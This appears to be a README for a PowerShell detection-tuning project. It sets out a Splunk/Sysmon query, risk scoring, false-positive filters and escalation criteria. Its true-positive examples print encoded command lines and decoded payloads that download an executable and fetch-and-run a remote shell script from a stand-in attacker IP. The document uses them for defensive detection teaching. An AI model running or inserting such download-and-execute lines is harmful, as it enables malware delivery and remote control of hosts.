# PowerShell Execution Detection - Tuning & Improvement

## Overview

This detection identifies suspicious PowerShell execution patterns commonly used by attackers while filtering out legitimate automation and administrative activity. The baseline detection generates excessive false positives in production environments (typically 90-95% FP rate), wasting analyst time on benign events. Through systematic tuning, false positives can be reduced to manageable levels (15-20%) while maintaining 100% true positive detection.

---

## Data Source

**Primary Log Source:** Windows Sysmon Event ID 1 (Process Creation)  
**Alternative:** Windows Security Event ID 4688 (Process Creation)  
**Required Fields:** Image, ParentImage, CommandLine, User, ComputerName, _time

**Why Sysmon?**
- Provides detailed process creation events with full command-line arguments
- Captures parent-child process relationships critical for detection
- More reliable than Security Event 4688 which requires audit policy configuration
- Standard in enterprise SOC environments

---

## Problem Statement

**Baseline Detection Issue:**

Most SOCs start with an overly broad PowerShell detection that triggers on every execution. This results in:
- **Alert volume:** 500-2,000+ alerts per day in medium enterprise (5,000 endpoints)
- **False positive rate:** 90-95% typical in production
- **Analyst impact:** 15-30 hours per day wasted across SOC team
- **Alert fatigue:** Real threats buried in noise, delayed response times

**Common False Positive Scenarios:**
1. SCCM/Group Policy software deployments running as SYSTEM
2. Windows Update operations executing PowerShell modules
3. Scheduled administrative scripts (backups, log collection, maintenance)
4. IT help desk remote management via WinRM
5. Legitimate monitoring and security tools
6. Developer workstations running build scripts

---

## Detection Logic

### Baseline Detection (Noisy)

**File:** `baseline_detection.spl`
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=1 Image="*powershell.exe"
| table _time ComputerName User Image ParentImage CommandLine
| sort -_time
```

**Problems:**
- Catches ALL PowerShell execution without discrimination
- No filtering for legitimate automation or system processes
- No contextual analysis of command intent
- No consideration of parent processes or user accounts
- Generates overwhelming alert volume

---

### Tuned Detection (Improved)

**File:** `tuned_detection.spl`
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=1 Image="*powershell.exe"
| where NOT (
    (like(ParentImage, "%CcmExec.exe%") AND User="NT AUTHORITY\\SYSTEM") OR
    (like(ParentImage, "%svchost.exe%") AND User="NT AUTHORITY\\SYSTEM") OR
    (like(ParentImage, "%wuauclt.exe%") AND User="NT AUTHORITY\\SYSTEM") OR
    (like(ParentImage, "%services.exe%")) OR
    (like(ParentImage, "%wsmprovhost.exe%") AND like(User, "%helpdesk%"))
)
| where match(CommandLine, "(?i)-e\s|-enc|-encodedcommand|-windowstyle\s+hidden|-exec\s+bypass|-nop") 
   OR like(ParentImage, "%EXCEL.EXE%") 
   OR like(ParentImage, "%WINWORD.EXE%") 
   OR like(ParentImage, "%POWERPNT.EXE%")
   OR like(ParentImage, "%\\Downloads\\%")
   OR like(ParentImage, "%\\AppData\\Local\\Temp\\%")
| eval risk_score = 0
| eval risk_score = if(match(CommandLine, "(?i)-e\s|-enc|-encodedcommand"), risk_score + 3, risk_score)
| eval risk_score = if(match(CommandLine, "(?i)-windowstyle\s+hidden"), risk_score + 2, risk_score)
| eval risk_score = if(match(CommandLine, "(?i)-exec\s+bypass|-nop"), risk_score + 2, risk_score)
| eval risk_score = if(like(ParentImage, "%EXCEL.EXE%") OR like(ParentImage, "%WINWORD.EXE%") OR like(ParentImage, "%POWERPNT.EXE%"), risk_score + 4, risk_score)
| eval risk_score = if(like(ParentImage, "%\\Downloads\\%") OR like(ParentImage, "%\\AppData\\Local\\Temp\\%"), risk_score + 3, risk_score)
| eval risk_score = if(NOT like(User, "%SYSTEM%") AND NOT like(User, "%svc-%"), risk_score + 1, risk_score)
| eval severity = case(
    risk_score >= 7, "CRITICAL",
    risk_score >= 5, "HIGH",
    risk_score >= 3, "MEDIUM",
    1==1, "LOW"
)
| table _time ComputerName User Image ParentImage CommandLine risk_score severity
| sort -risk_score, -_time
```

---

## Tuning Methodology

### Layer 1: Whitelist Legitimate Parent Processes

**Filters out:**
- **SCCM deployments:** CcmExec.exe running as SYSTEM
- **Group Policy scripts:** svchost.exe executing domain automation as SYSTEM
- **Windows Updates:** wuauclt.exe running system maintenance
- **System services:** services.exe spawning legitimate processes
- **Help desk remote management:** wsmprovhost.exe (WinRM) by authorized accounts

**Rationale:** These parent processes represent standard enterprise automation. When running as SYSTEM or approved service accounts, they're almost always legitimate.

---

### Layer 2: Focus on Suspicious Indicators

**Detects:**
- **Encoded commands (`-e`, `-enc`, `-encodedcommand`):** Obfuscation technique to hide malicious payloads
- **Hidden windows (`-windowstyle hidden`):** Attackers hide execution from users
- **Execution policy bypass (`-exec bypass`, `-nop`):** Circumventing security controls
- **Office apps spawning PowerShell:** Classic macro malware delivery vector
- **Downloads/Temp folders:** User-downloaded or staged malicious executables

**Rationale:** These characteristics are rarely seen in legitimate automation but are extremely common in attacker tradecraft. The `-e` flag is particularly important as it's the shortest way to invoke encoded commands and is heavily used in real-world attacks.

---

### Layer 3: Risk Scoring & Prioritization

**Scoring Breakdown:**
- Encoded command (`-e`, `-enc`, `-encodedcommand`): **+3 points** (high suspicion - obfuscation intent)
- Hidden window: **+2 points** (stealth technique)
- Execution policy bypass: **+2 points** (security control evasion)
- Office application parent: **+4 points** (macro malware vector)
- Downloads/Temp folder parent: **+3 points** (staged executable)
- Non-system/service user: **+1 point** (user-initiated vs. automated)

**Severity Classification:**
- **CRITICAL (7+):** Immediate escalation - multiple attack indicators
- **HIGH (5-6):** Escalate after quick context validation
- **MEDIUM (3-4):** Investigate thoroughly, document findings
- **LOW (1-2):** Monitor, possible whitelist candidate

**Rationale:** Not all suspicious PowerShell requires immediate escalation. Risk scoring allows analysts to prioritize based on threat confidence and environmental context.

---

## Projected Production Impact

**Estimated metrics for medium enterprise (5,000 endpoints):**

| Metric | Baseline (Untuned) | Tuned | Impact |
|--------|-------------------|-------|--------|
| Daily Alert Volume | 800 alerts | 50 alerts | 93.75% reduction |
| False Positive Rate | 95% | 15% | 80% improvement |
| Daily Analyst Hours | 50 hours | 1.25 hours | 48.75 hours saved/day |
| Annual Cost Savings | - | - | **~$490,000/year** |

*Assumptions: 4 min avg triage time, analyst cost $70k + benefits*

---

## True Positive Examples

### Example 1: Excel-Spawned Malware Download
```
User: CORP\jsmith
ParentImage: C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
CommandLine: powershell.exe -windowstyle hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...
Risk Score: 10 (CRITICAL)
```

**Decoded Payload:**
```powershell
$client = New-Object System.Net.WebClient;
$client.DownloadFile("http://192.168.10.50/m.exe", "C:\Users\Public\m.exe")
```

**Analysis:** Excel spawning PowerShell (+4), encoded command (+3), hidden window (+2), regular user (+1) = **10 points**

**Attack Vector:** Malicious Excel macro executing obfuscated PowerShell to download malware from external IP

**MITRE ATT&CK:** T1566.001 (Phishing), T1059.001 (PowerShell), T1027 (Obfuscation), T1204.002 (User Execution)

---

### Example 2: Phishing Attachment Reverse Shell
```
User: CORP\mbrown
ParentImage: C:\Users\mbrown\Downloads\invoice_2024.exe
CommandLine: powershell.exe -nop -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
Risk Score: 9 (CRITICAL)
```

**Decoded Payload:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50/shell.ps1')
```

**Analysis:** Downloads parent (+3), encoded command (+3), bypass (+2), regular user (+1) = **9 points**

**Attack Vector:** User executed phishing attachment which spawned encoded PowerShell reverse shell connecting to attacker C2

**MITRE ATT&CK:** T1566.001 (Phishing), T1059.001 (PowerShell), T1027 (Obfuscation), T1071.001 (Web Protocols)

---

## False Positive Examples Eliminated

### 1. SCCM Software Deployment
```
ParentImage: C:\Windows\CCM\CcmExec.exe
User: NT AUTHORITY\SYSTEM
CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\Scripts\Deploy-Software.ps1
```
**Why Filtered:** SCCM agent running as SYSTEM executing enterprise deployment script from standard SCCM path

---

### 2. Group Policy Script
```
ParentImage: C:\Windows\System32\svchost.exe
User: NT AUTHORITY\SYSTEM
CommandLine: powershell.exe -ExecutionPolicy RemoteSigned -File C:\Windows\SYSVOL\scripts\Update-Registry.ps1
```
**Why Filtered:** Domain GPO executing from SYSVOL share via svchost as SYSTEM

---

### 3. Admin Backup Script
```
ParentImage: C:\Windows\System32\cmd.exe
User: CORP\svc-admin
CommandLine: powershell.exe -File C:\Scripts\Backup-Logs.ps1
```
**Why Filtered:** Service account executing known backup script from standard admin repository

---

### 4. Windows Update
```
ParentImage: C:\Windows\System32\wuauclt.exe
User: NT AUTHORITY\SYSTEM
CommandLine: powershell.exe -Command "Get-WindowsUpdate -Install -AcceptAll"
```
**Why Filtered:** Windows Update client executing PowerShell module as SYSTEM for OS maintenance

---

### 5. Help Desk Remote Support
```
ParentImage: C:\Windows\System32\wsmprovhost.exe
User: CORP\helpdesk01
CommandLine: powershell.exe -Command "Get-Process | Where-Object {$_.CPU -gt 50}"
```
**Why Filtered:** WinRM provider used by authorized help desk account for legitimate remote support

---

## Investigation Workflow

See: `investigation_playbook.md` for detailed step-by-step procedures

**Quick Triage (5-10 minutes):**
1. Review alert context (time, user, system criticality)
2. Analyze parent process legitimacy and user context match
3. Decode any encoded commands and analyze for IOCs
4. Check network activity for external connections
5. Search for related suspicious activity on host/user

---

## Escalation Criteria

See: `escalation_criteria.md` for complete decision tree

**Immediate Escalation:**
- Encoded PowerShell with suspicious parent (Office, Downloads)
- Known malware signatures (Mimikatz, Cobalt Strike, Meterpreter)
- Execution on Domain Controllers or critical systems
- Domain Admin account executing suspicious PowerShell
- Risk score 7+ (CRITICAL severity)

**Investigate Then Escalate:**
- Encoded commands without clear business justification
- External connections to non-whitelisted destinations
- Off-hours execution from non-IT accounts
- Risk score 5-6 (HIGH severity)

**Investigate & Close:**
- Known automation with verified hash/path
- IT accounts with documented business purpose
- Successfully blocked by endpoint protection
- Risk score 3-4 (MEDIUM) with legitimate context

---

## Files in This Detection

- `README.md` - This file
- `01-baseline-detection.spl` - Original noisy detection query
- `02-tuned-detection.spl` - Improved detection with filtering and risk scoring
- `03-investigation-playbook.md` - Step-by-step triage procedures
- `04-false-positive-analysis.md` - Detailed FP scenarios and resolutions
- `05-tuning-rationale.md` - Technical justification for tuning decisions
- `06-escalation-criteria.md` - Decision tree for escalation vs. closure
- `07-metrics.md` - Performance metrics and cost-benefit analysis

---

## MITRE ATT&CK Mapping

**Primary Techniques:**
- **T1059.001** - PowerShell (encoded commands, obfuscation)
- **T1027** - Obfuscated Files or Information
- **T1204.002** - User Execution: Malicious File

**Related Techniques:**
- T1566.001 - Phishing: Spearphishing Attachment
- T1071.001 - Application Layer Protocol: Web Protocols
- T1105 - Ingress Tool Transfer

---

## Key Takeaways

1. **Parent process analysis is critical** - spawning process provides context for legitimacy assessment
2. **Obfuscation is a strong signal** - encoded commands, hidden windows rarely legitimate in enterprises
3. **Risk scoring enables prioritization** - not all suspicious PowerShell needs immediate escalation
4. **Whitelisting prevents burnout** - filter known automation without sacrificing detection coverage
5. **Context trumps signatures** - same indicator can be benign (SCCM) or malicious (Excel) based on context

---

## Continuous Improvement

**Next Steps for Production:**
1. Build inventory of approved automation scripts and hash them for dynamic whitelist
2. Correlate with network connection data (Sysmon Event ID 3) for enhanced detection
3. Implement user behavior analytics for first-time PowerShell usage anomalies
4. Convert to Sigma rule format for cross-platform SIEM portability
5. Track monthly metrics (TP/FP rates, time saved) and report ROI to leadership

---

## Author Notes

This detection demonstrates practical SOC capabilities:
- Understanding attacker techniques vs. legitimate enterprise automation
- Balancing detection coverage with operational efficiency
- Risk-based prioritization for analyst workflows
- Business impact measurement and cost justification

The methodology (whitelist automation → focus on suspicious indicators → implement risk scoring) is repeatable across other high-volume detections and represents real-world SOC engineering best practices.
